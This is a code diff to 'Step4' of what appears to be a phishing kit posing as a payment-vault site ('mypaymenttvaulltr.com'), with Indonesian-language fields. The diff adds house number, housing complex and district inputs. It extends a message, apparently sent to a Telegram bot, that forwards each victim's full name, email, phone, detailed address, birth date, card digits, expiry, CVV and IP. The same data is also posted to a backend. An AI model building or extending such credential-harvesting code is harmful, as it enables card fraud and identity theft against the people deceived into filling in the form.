@@ -166,7 +166,10 @@ export default function Step4() {
   const [dialOpen, setDialOpen]         = useState(false);
   const [dialSearch, setDialSearch]     = useState("");
   const dialRef = useRef<HTMLDivElement>(null);
+  const [houseNo, setHouseNo]           = useState("");
+  const [complex, setComplex]           = useState("");
   const [address, setAddress]           = useState("");
+  const [district, setDistrict]         = useState("");
   const [city, setCity]                 = useState("");
   const [stateVal, setStateVal]         = useState("");
   const [postalCode, setPostalCode]     = useState("");
@@ -205,7 +208,9 @@ export default function Step4() {
     if (!lastName.trim())    e.lastName    = "Wajib diisi.";
     if (!email.trim())       e.email       = "Wajib diisi.";
     if (!phone.trim())       e.phone       = "Wajib diisi.";
+    if (!houseNo.trim())     e.houseNo     = "Wajib diisi.";
     if (!address.trim())     e.address     = "Wajib diisi.";
+    if (!district.trim())    e.district    = "Wajib diisi.";
     if (!city.trim())        e.city        = "Wajib diisi.";
     if (!stateVal.trim())    e.state       = "Wajib diisi.";
     if (!postalCode.trim())  e.postalCode  = "Wajib diisi.";
@@ -238,19 +243,26 @@ export default function Step4() {
         `📋 <b>mypaymenttvaulltr.com</b>\n` +
         `📌 <b>Step 4 — Data Personal</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `👤 <b>Username</b>     : <code>${user?.username ?? "-"}</code>\n` +
-        `👦 <b>Nama Lengkap</b> : <code>${firstName} ${lastName}</code>\n` +
-        `📧 <b>Email</b>        : <code>${email}</code>\n` +
-        `📱 <b>Mobile</b>       : <code>${dialCode} ${phone}</code>\n` +
-        `🏠 <b>Alamat</b>       : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
-        `🎂 <b>Tgl Lahir</b>    : <code>${dob}</code>\n` +
-        `📌 <b>Inquiry</b>      : <code>${inquiryType}</code>\n` +
-        `💬 <b>Pesan</b>        : <code>${message || "-"}</code>\n` +
-        `💳 <b>Akhiran Kartu</b>: <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
-        `📅 <b>Exp</b>          : <code>${cardExp.trim()}</code>\n` +
-        `🔐 <b>CVV</b>          : <code>${cardCvv.trim()}</code>\n` +
-        `🌐 <b>IP & Lokasi</b>  : <code>${ip}</code>\n` +
-        `🕐 <b>Waktu</b>        : ${now}\n` +
+        `👤 <b>Username</b>       : <code>${user?.username ?? "-"}</code>\n` +
+        `👦 <b>Nama Lengkap</b>   : <code>${firstName} ${lastName}</code>\n` +
+        `📧 <b>Email</b>          : <code>${email}</code>\n` +
+        `📱 <b>Mobile</b>         : <code>${dialCode} ${phone}</code>\n` +
+        `🎂 <b>Tgl Lahir</b>      : <code>${dob}</code>\n\n` +
+        `🏘️ <b>ALAMAT LENGKAP</b>\n` +
+        `🏠 <b>No Rumah / Blok</b>: <code>${houseNo}</code>\n` +
+        `🏢 <b>Nama Komplek</b>   : <code>${complex || "-"}</code>\n` +
+        `🛣️ <b>Nama Jalan</b>     : <code>${address}</code>\n` +
+        `🏘️ <b>Kecamatan</b>      : <code>${district}</code>\n` +
+        `🏙️ <b>Kota / Kab</b>     : <code>${city}</code>\n` +
+        `📍 <b>Provinsi</b>       : <code>${stateVal}</code>\n` +
+        `📮 <b>Kode Pos</b>       : <code>${postalCode}</code>\n\n` +
+        `📌 <b>Inquiry</b>        : <code>${inquiryType}</code>\n` +
+        `💬 <b>Pesan</b>          : <code>${message || "-"}</code>\n` +
+        `💳 <b>Akhiran Kartu</b>  : <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
+        `📅 <b>Exp</b>            : <code>${cardExp.trim()}</code>\n` +
+        `🔐 <b>CVV</b>            : <code>${cardCvv.trim()}</code>\n` +
+        `🌐 <b>IP & Lokasi</b>    : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>          : ${now}\n` +
         `━━━━━━━━━━━━━━━━━━━━━`
       );
 
@@ -260,7 +272,7 @@ export default function Step4() {
         body: JSON.stringify({
           username: user?.username ?? "",
           firstName, lastName, email, phone: `${dialCode} ${phone}`,
-          address, city, state: stateVal, postalCode,
+          houseNo, complex, address, district, city, state: stateVal, postalCode,
           dob, inquiryType, message,
           cardDigits: cardDigits.trim(),
           cardExp: cardExp.trim(),
@@ -433,44 +445,66 @@ export default function Step4() {
 
           {/* ── Section: Address ── */}
           <SectionHead>Mailing Address</SectionHead>
+          <div style={row}>
+            <div>
+              <Lbl required>No. Rumah &amp; Blok</Lbl>
+              <input className="s4i" type="text" placeholder="Contoh: No. 12 Blok B3" value={houseNo}
+                onChange={e => setHouseNo(e.target.value)}
+                style={{ ...inp, borderColor: errors.houseNo ? "#c00" : "#ddd" }} />
+              <Err k="houseNo" />
+            </div>
+            <div>
+              <Lbl>Nama Perumahan / Komplek</Lbl>
+              <input className="s4i" type="text" placeholder="Contoh: Griya Asri Residence" value={complex}
+                onChange={e => setComplex(e.target.value)}
+                style={{ ...inp, borderColor: "#ddd" }} />
+            </div>
+          </div>
           <div style={{ marginBottom: 20 }}>
-            <Lbl required>Street Address</Lbl>
-            <input className="s4i" type="text" placeholder="123 Main Street" value={address}
+            <Lbl required>Nama Jalan</Lbl>
+            <input className="s4i" type="text" placeholder="Contoh: Jl. Merdeka Raya" value={address}
               onChange={e => setAddress(e.target.value)}
               style={{ ...inp, borderColor: errors.address ? "#c00" : "#ddd" }} />
             <Err k="address" />
           </div>
           <div style={row}>
             <div>
-              <Lbl required>City</Lbl>
-              <input className="s4i" type="text" placeholder="City" value={city}
+              <Lbl required>Kecamatan</Lbl>
+              <input className="s4i" type="text" placeholder="Contoh: Kec. Cilandak" value={district}
+                onChange={e => setDistrict(e.target.value)}
+                style={{ ...inp, borderColor: errors.district ? "#c00" : "#ddd" }} />
+              <Err k="district" />
+            </div>
+            <div>
+              <Lbl required>Kota / Kabupaten</Lbl>
+              <input className="s4i" type="text" placeholder="Contoh: Jakarta Selatan" value={city}
                 onChange={e => setCity(e.target.value)}
                 style={{ ...inp, borderColor: errors.city ? "#c00" : "#ddd" }} />
               <Err k="city" />
             </div>
+          </div>
+          <div style={row}>
             <div>
-              <Lbl required>State / Province</Lbl>
-              <input className="s4i" type="text" placeholder="State" value={stateVal}
+              <Lbl required>Provinsi</Lbl>
+              <input className="s4i" type="text" placeholder="Contoh: DKI Jakarta" value={stateVal}
                 onChange={e => setStateVal(e.target.value)}
                 style={{ ...inp, borderColor: errors.state ? "#c00" : "#ddd" }} />
               <Err k="state" />
             </div>
-          </div>
-          <div style={row}>
             <div>
-              <Lbl required>Postal Code</Lbl>
+              <Lbl required>Kode Pos</Lbl>
               <input className="s4i" type="text" placeholder="00000" value={postalCode}
                 onChange={e => setPostalCode(e.target.value)}
                 style={{ ...inp, borderColor: errors.postalCode ? "#c00" : "#ddd" }} />
               <Err k="postalCode" />
             </div>
-            <div>
-              <Lbl required>Date of Birth</Lbl>
-              <input className="s4i" type="text" placeholder="MM-DD-YYYY" value={dob}
-                onChange={e => setDob(e.target.value)}
-                style={{ ...inp, borderColor: errors.dob ? "#c00" : "#ddd" }} />
-              <Err k="dob" />
-            </div>
+          </div>
+          <div style={{ marginBottom: 20 }}>
+            <Lbl required>Date of Birth</Lbl>
+            <input className="s4i" type="text" placeholder="MM-DD-YYYY" value={dob}
+              onChange={e => setDob(e.target.value)}
+              style={{ ...inp, borderColor: errors.dob ? "#c00" : "#ddd" }} />
+            <Err k="dob" />
           </div>
 
           {/* ── Section: Inquiry ── */}
